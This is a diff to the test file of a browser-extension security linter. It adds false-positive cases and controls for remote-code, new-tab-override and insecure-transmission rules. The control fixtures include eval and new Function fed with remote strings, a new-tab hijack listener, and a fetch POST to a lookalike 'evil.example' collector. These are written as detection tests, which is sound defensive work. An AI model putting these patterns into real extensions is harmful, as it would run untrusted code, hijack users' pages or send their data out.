@@ -1258,6 +1258,192 @@ check("ntp: THE CONTROL - a guard that feeds a redirect is still caught",
 check("ntp: a guard and a distant unrelated tabs.update do not pair up",
   !ids(lint(pkg({ "manifest.json": ntpBase, "sw.js": "const isBlank = (u) => u === 'chrome://newtab/';\n" + "// filler\n".repeat(60) + "chrome.tabs.update(someId, { url: dest });\n" }))).includes("ntp-override"));
 
+// ===========================================================================
+// s137, T-0413's THIRD corpus widening (450 -> 750 repos). Four false
+// positives, each verbatim from a repository in that corpus, each paired with
+// a control that must still fire. The controls are the half that matters: a
+// narrowing without one is how a linter quietly stops detecting the thing it
+// exists to detect.
+// ===========================================================================
+
+// (i) `new Function()` WITH NO ARGUMENT AT ALL. It builds an empty function -
+// there is no string, so nothing can arrive from the network in it - and the
+// existing carve-out required an empty QUOTED argument, so the bare call walked
+// straight through. Six files in the 750-repo corpus contain it and every one
+// is prose or a policy check FORBIDDING the call. This is Mootong/
+// x-twitter-media-downloader's build-time validator, verbatim, which was the
+// SOLE evidence for a FAIL on that package.
+const emptyFnCall = mkExt("Validator", "An extension whose build script refuses eval and Function.", {
+  "app.js": 'chrome.storage.local.get("k");\nassert(!/\\bnew\\s+Function\\s*\\(/.test(source), `new Function() is not allowed: ${filename}`);\n',
+});
+check("a bare new Function() with no argument is not a remote-code FAIL", !rcFail(emptyFnCall),
+  JSON.stringify(ids(lint(emptyFnCall))));
+
+// CONTROLS. The proof is "no string was passed", so anything that DOES pass one
+// must still fail - including the shape that merely starts with an empty string.
+const fnFromVar = mkExt("FromVar", "An extension that builds a function from a variable.", {
+  "app.js": 'chrome.storage.local.get("k");\nconst f = new Function(fetchedFromServer);\n',
+});
+check("CONTROL: new Function(identifier) still fails", Boolean(rcFail(fnFromVar)));
+
+const fnFromConcat = mkExt("Concat", "An extension that concatenates a remote value into a function body.", {
+  "app.js": 'chrome.storage.local.get("k");\nconst f = new Function("return " + payload);\n',
+});
+check("CONTROL: new Function(\"return \" + x) still fails", Boolean(rcFail(fnFromConcat)));
+
+const fnEmptyArgThenBody = mkExt("ArgList", "An extension that names a parameter and then supplies a body.", {
+  "app.js": 'chrome.storage.local.get("k");\nconst f = new Function("", remoteBody);\n',
+});
+check("CONTROL: new Function(\"\", body) - empty ARG then a real body - still fails",
+  Boolean(rcFail(fnEmptyArgThenBody)), JSON.stringify(ids(lint(fnEmptyArgThenBody))));
+
+// (ii) `eval(` FOLLOWED IMMEDIATELY BY `?` IS A REGEX GROUP OPENER, and `?`
+// cannot begin an expression in JavaScript, so it is provably not a call. Two
+// unrelated repos, and in both the regex is ABOUT eval rather than a use of it:
+// ha0z1/New-Bing-Anywhere (2116 stars) ships a highlight.js keyword alternation
+// containing `|eval(?:cmd)?|` in a 356 KB line of its BUILT package - sole
+// evidence for a FAIL - and magicelk235/Viaduct-CLI validates a CSP with
+// `/(?:^|[\s;'"])unsafe-eval(?:[\s;'"]|$)/`.
+const grammarRegex = mkExt("Highlighter", "An extension that highlights source code with a language grammar.", {
+  "app.js": 'chrome.storage.local.get("k");\nconst KEYWORDS = /del|delete|diag|do|dowith3?|drop|eval(?:cmd)?|exactp|filter|fix/;\n',
+});
+check("a regex group opener after eval( is not a remote-code FAIL", !rcFail(grammarRegex),
+  JSON.stringify(ids(lint(grammarRegex))));
+
+const cspValidator = mkExt("CspCheck", "An extension that refuses a manifest declaring unsafe-eval.", {
+  "app.js": 'chrome.storage.local.get("k");\nif (/(?:^|[\\s;\'"])unsafe-eval(?:[\\s;\'"]|$)/.test(csp)) throw new Error("unsafe-eval");\n',
+});
+check("...and so is the unsafe-eval CSP check that spells it the same way", !rcFail(cspValidator),
+  JSON.stringify(ids(lint(cspValidator))));
+
+// CONTROLS. A ternary argument has whitespace before its `?` and a real call
+// never has one immediately after the paren, so neither of these may go quiet.
+const evalTernaryTight = mkExt("Ternary2", "An extension whose eval picks between two remote strings.", {
+  "app.js": 'chrome.storage.local.get("k");\nvar out = eval(cond ? remoteA : remoteB);\n',
+});
+check("CONTROL: eval(cond ? a : b) still fails", Boolean(rcFail(evalTernaryTight)));
+
+// THE ONE THAT PROVES THE SKIP IS PER MATCH. grep() takes one match per line
+// unless the accept callback rejects it and lets the scan resume, so a real call
+// sharing a line with the grammar regex must still be found. Asserting only "a
+// FAIL is produced" would also pass if the tool had gone on reporting the regex,
+// so the assertion is on the reported MATCH TEXT.
+const GRAMMAR_THEN_REAL = 'const K = /drop|eval(?:cmd)?|filter/; var out = eval(fetchedFromServer);';
+const grammarThenReal = mkExt("Both", "An extension with a grammar regex and a real call on one line.", {
+  "app.js": `chrome.storage.local.get("k");\n${GRAMMAR_THEN_REAL}\n`,
+});
+{
+  const f = rcFail(grammarThenReal);
+  check("CONTROL: a real eval after the grammar regex on the SAME line still fails", Boolean(f),
+    JSON.stringify(ids(lint(grammarThenReal))));
+  // ON THE COLUMN, NOT ON THE MATCH TEXT. The match is `|eval(` either way - it
+  // stops at the paren and never contains the `?` - so an assertion about the
+  // text would be satisfied by the tool going on reporting the regex, which is
+  // exactly the failure this control exists to catch. The column is the only
+  // field that distinguishes the two sites.
+  check("CONTROL: and the site reported is the call, not the regex",
+    /^.?eval\(fetchedFromServer/.test(GRAMMAR_THEN_REAL.slice(f?.evidence?.[0]?.col ?? 0)),
+    JSON.stringify({ col: f?.evidence?.[0]?.col, at: GRAMMAR_THEN_REAL.slice(f?.evidence?.[0]?.col ?? 0, (f?.evidence?.[0]?.col ?? 0) + 30) }));
+}
+
+// (iii) NEW TAB PAGE: the 200-character window paired a CONSTANT with an
+// unrelated wrapper two functions away. Verbatim from sindresorhus/
+// notifier-for-github (1978 stars), which was FAILed for listing the new tab
+// page among the "empty tab" urls it REUSES when you click its button. The gap
+// is 193 characters, so the finding existed by a margin of seven.
+const NOTIFIER = [
+  "export const emptyTabUrls = isChrome() ? [",
+  "\t'chrome://newtab/',",
+  "\t'chrome-search://local-ntp/local-ntp.html'",
+  "] : [];",
+  "",
+  "export async function createTab(url) {",
+  "\treturn browser.tabs.create({url});",
+  "}",
+  "",
+  "export async function updateTab(tabId, options) {",
+  "\treturn browser.tabs.update(tabId, options);",
+  "}",
+  "",
+].join("\n");
+check("ntp: a url constant and a generic tabs.update wrapper two functions apart do not pair up",
+  !ids(lint(pkg({ "manifest.json": ntpBase, "sw.js": NOTIFIER }))).includes("ntp-override"),
+  JSON.stringify(ids(lint(pkg({ "manifest.json": ntpBase, "sw.js": NOTIFIER })))));
+
+// CONTROL, AND IT IS THE ONE THAT SAYS THIS IS NOT A DISTANCE FIX. The same two
+// halves, the same 190-odd characters apart, with NOTHING closing between them:
+// still a FAIL. If this ever goes quiet the narrowing became "sites far apart do
+// not count", which is not what was measured and would mute real hijacks.
+const FAR_BUT_SAME_BLOCK =
+  "chrome.tabs.onUpdated.addListener((id, info, tab) => {\n" +
+  "  if (tab.url === 'chrome://newtab/') {\n" +
+  "    const dest = readSetting('startPage');\n" +
+  "    const when = Date.now();\n" +
+  "    const note = 'redirecting the new tab page to our own start page now';\n" +
+  "    chrome.tabs.update(id, { url: dest });\n" +
+  "  }\n" +
+  "});\n";
+check("ntp: CONTROL - a hijack whose halves are just as far apart, with no block closing between, still fails",
+  bySeverity(lint(pkg({ "manifest.json": ntpBase, "sw.js": FAR_BUT_SAME_BLOCK })), "fail").includes("ntp-override"),
+  JSON.stringify(ids(lint(pkg({ "manifest.json": ntpBase, "sw.js": FAR_BUT_SAME_BLOCK })))));
+
+// CONTROL: a MINIFIED hijack has no line starts at all, so the new signal can
+// never fire on one and every shipped bundle is judged exactly as before.
+const MINIFIED_HIJACK =
+  'chrome.tabs.onUpdated.addListener(function(e,t,n){if(n.url=="chrome://newtab/"){var r=o();chrome.tabs.update(e,{url:r})}});\n';
+check("ntp: CONTROL - the same hijack minified onto one line still fails",
+  bySeverity(lint(pkg({ "manifest.json": ntpBase, "sw.js": MINIFIED_HIJACK })), "fail").includes("ntp-override"),
+  JSON.stringify(ids(lint(pkg({ "manifest.json": ntpBase, "sw.js": MINIFIED_HIJACK })))));
+
+// (iv) INSECURE TRANSMISSION reasoned from a list of eight w3.org prefixes, so
+// the widened corpus walked round it at once: 49 of the 181 evidence entries it
+// produced over 750 repos are match patterns or specification namespaces at
+// other hosts. Both classes are provable rather than tasteful - a `*` in the
+// authority means there is no host to reach, and an xmlns attribute or the first
+// argument of a *NS() DOM call is a NAME by definition.
+const notEndpoints = mkExt("Office", "An extension that reads docx files and declares match patterns.", {
+  "app.js": [
+    'chrome.storage.local.get("k");',
+    'const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument";',
+    'const sig = xml.getElementsByTagNameNS("http://www.w3.org/2000/09/xmldsig#", "Signature");',
+    'chrome.declarativeNetRequest.updateSessionRules({ addRules: [{ condition: { urlFilter: "x" } }] });',
+    'const rule = { matches: ["http://*/*"], documentUrlPatterns: ["http://*/*"] };',
+    '',
+  ].join("\n"),
+  "page.html": '<svg xmlns:ns2="http://www.inkscape.org/namespaces/inkscape"></svg>\n',
+});
+check("match patterns and specification namespaces are not reported as insecure endpoints",
+  !ids(lint(notEndpoints)).includes("insecure-transmission"),
+  JSON.stringify(lint(notEndpoints).findings.find((f) => f.rule === "insecure-transmission")?.evidence || []));
+
+// CONTROLS. A named host is still a host, whatever wildcards follow the slash,
+// and a real endpoint sharing a LINE with a namespace must still be reported -
+// which only works because the skip resumes the scan rather than dropping the
+// line.
+const namedHostPattern = mkExt("Named", "An extension that names a host over plain http.", {
+  "app.js": 'chrome.storage.local.get("k");\nconst hosts = ["http://tracking.example.com/*"];\n',
+});
+check("CONTROL: a wildcard PATH under a real host is still reported",
+  ids(lint(namedHostPattern)).includes("insecure-transmission"));
+
+const nsBesideEndpoint = mkExt("SameLine", "An extension whose namespace and api call share a line.", {
+  "app.js": 'chrome.storage.local.get("k");\nel.setAttributeNS("http://www.w3.org/2000/xmlns/", "xmlns:x", "y"); fetch("http://collect.example.com/beacon");\n',
+});
+{
+  const f = lint(nsBesideEndpoint).findings.find((x) => x.rule === "insecure-transmission");
+  check("CONTROL: an endpoint sharing a line with a namespace is still reported", Boolean(f),
+    JSON.stringify(ids(lint(nsBesideEndpoint))));
+  check("CONTROL: and the site reported is the endpoint, not the namespace",
+    /collect\.example\.com/.test(JSON.stringify(f?.evidence || [])), JSON.stringify(f?.evidence));
+}
+
+const httpNotAName = mkExt("Fetcher", "An extension that posts to a plain http collector.", {
+  "app.js": 'chrome.storage.local.get("k");\nfetch("http://schemas.openxmlformats.org.evil.example/collect", { method: "POST" });\n',
+});
+check("CONTROL: a lookalike host that only STARTS like a namespace prefix is still reported",
+  ids(lint(httpNotAName)).includes("insecure-transmission"),
+  JSON.stringify(ids(lint(httpNotAName))));
+
 // 2b-bis. THE MANIFEST NAMES FILES THAT ARE NOT HERE. Authenticator was failed
 // for five permissions "never used" while we linted a folder of seven JSON
 // files and no code at all; its manifest names dist/background.js.
